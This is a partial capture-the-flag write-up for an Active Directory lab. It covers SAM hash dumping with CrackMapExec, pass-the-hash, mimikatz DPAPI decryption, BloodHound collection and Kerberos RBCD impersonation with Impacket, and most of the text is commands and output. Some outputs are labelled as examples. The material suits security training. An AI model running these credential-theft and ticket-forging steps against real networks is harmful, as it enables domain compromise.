# Active Directory Lab — SOKOLO
## Progress Report / Partial Write-up

Author: <your name>  
Date: <date>

---

# 1. Lab Overview

Domain: SOKOLO.DOJO

Identified machines:

| Host | IP | Role |
|-----|-----|-----|
| WS | 176.16.35.160 | Workstation |
| DC | 176.16.35.133 | Domain Controller |
| DC1 | 176.16.35.157 | Domain Controller |
| DC2 | 176.16.35.158 | Domain Controller |
| DC3 | 176.16.35.159 | Domain Controller |

Goal: Retrieve **3 flags**.

---

# 2. Initial Access

The lab provides credentials for the user **SecDojo**.

RDP connection to the workstation:

```
xfreerdp3 /u:SecDojo /p:'Password@2030!#$%' /d:SOKOLO /v:176.16.35.160
```

Credentials used:

```
User: SecDojo
Password: Password@2030!#$%
Domain: SOKOLO
```

Result:

Connection to the workstation **WS** was successful.

---

# 3. SMB Enumeration

Using CrackMapExec to enumerate SMB and dump local SAM.

Command:

```
crackmapexec smb 176.16.35.160 -u SecDojo -p 'Password@2030!#$%' --sam
```

Example output:

```
SMB         176.16.35.160 445 WS  [+] SOKOLO\SecDojo:Password@2030!#$%
SMB         176.16.35.160 445 WS  [+] Dumping SAM hashes
Administrator:fa3a14731237b27f0f98a41ecde384ab
Guest:31d6cfe0d16ae931b73c59d7e0c089c0
DefaultAccount:31d6cfe0d16ae931b73c59d7e0c089c0
```

Result:

The **NTLM hash of the local Administrator account** was obtained:

```
fa3a14731237b27f0f98a41ecde384ab
```

---

# 4. Pass-the-Hash Attack

Using Impacket to authenticate with the administrator hash.

Command:

```
impacket-wmiexec -hashes :fa3a14731237b27f0f98a41ecde384ab Administrator@176.16.35.160
```

Example output:

```
Impacket v0.13.0.dev0

[*] SMBv3.0 dialect used
[*] Authentication successful
[*] Launching semi-interactive shell
```

Result:

Administrative shell obtained on the workstation.

---

# 5. File System Enumeration

Exploring user directories.

Commands:

```
dir C:\Users
dir C:\Users\Administrator
dir C:\Users\Administrator\AppData
```

Discovery:

```
C:\Users\Administrator\AppData\Local\Microsoft\Credentials\
```

Inside this directory a credential blob was found:

```
DFBE70A7E5CC19A398EBF1B96859CE5D
```

Associated DPAPI masterkey:

```
a46e045e-b169-4b52-bed1-4841ce5fbd64
```

---

# 6. DPAPI Decryption Attempt

Attempted to decrypt the credential using **mimikatz**.

Commands executed:

```
privilege::debug
token::elevate
dpapi::cred /in:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D /unprotect
```

Result:

The credential could not be decrypted.

Reason:

DPAPI often requires the **original user password or masterkey**.

---

# 7. BloodHound Enumeration

Data collection performed with SharpHound.

Command:

```
SharpHound.exe -c all
```

BloodHound analysis revealed a **Resource-Based Constrained Delegation (RBCD)** configuration.

Relevant object:

```
kali$
```

Key attribute:

```
msDS-AllowedToActOnBehalfOfOtherIdentity
```

This indicates that **another machine account may impersonate users to kali$**.

---

# 8. Machine Account Hash

The hash of the machine account **WS$** was obtained:

```
WS$ : f746a11ed8387495c3126e95de95850f
```

---

# 9. Kerberos Ticket Request

Using Impacket to request a TGT for the machine account.

Command:

```
impacket-getTGT 'SOKOLO/WS$' -hashes :f746a11ed8387495c3126e95de95850f -dc-ip 176.16.35.133
```

Example output:

```
Impacket v0.13.0.dev0

[*] Getting TGT for user
[*] Saving ticket in WS$.ccache
```

Ticket generated:

```
WS$.ccache
```

Exporting the ticket:

```
export KRB5CCNAME=$(pwd)/WS$.ccache
```

---

# 10. Kerberos Pivot Attempt

Attempting to use the Kerberos ticket to access the Domain Controller.

Command:

```
impacket-wmiexec -k -no-pass -dc-ip 176.16.35.133 'SOKOLO/WS$@176.16.35.133'
```

Output:

```
[-] Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN
```

Explanation:

Kerberos requires a **valid Service Principal Name (SPN)** which usually corresponds to a **hostname (FQDN)** rather than an IP address.

---

# 11. RBCD Impersonation Attempt

Attempting to impersonate Administrator through RBCD.

Command:

```
impacket-getST -spn HOST/kali.SOKOLO.dojo \
-impersonate Administrator \
-dc-ip 176.16.35.133 \
'SOKOLO/WS$' \
-hashes :f746a11ed8387495c3126e95de95850f
```

Example output:

```
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@HOST_kali.SOKOLO.dojo@SOKOLO.DOJO.ccache
```

---

# 12. Attempt to Use the Ticket

Command:

```
export KRB5CCNAME=$(pwd)/Administrator@HOST_kali.SOKOLO.dojo@SOKOLO.DOJO.ccache
```

Then:

```
impacket-wmiexec -k -no-pass SOKOLO/Administrator@176.16.35.160
```

Output:

```
[-] Kerberos SessionError: KDC_ERR_PREAUTH_FAILED
```

The impersonation did not yet provide a usable session.

---

# Current Status

Access obtained:

- SecDojo user access
- Administrator NTLM hash
- Administrator shell on workstation
- WS$ machine account hash
- Kerberos ticket

Flags obtained:

```
0 / 3
```

---

# Next Steps

Possible attack paths:

1. Fully exploit the RBCD chain:

```
WS$ → kali$ → Administrator
```

2. Analyze permissions on the `kali$` object.

3. Retry Kerberos access using correct SPN / FQDN.

4. Re-analyze BloodHound paths for privilege escalation.
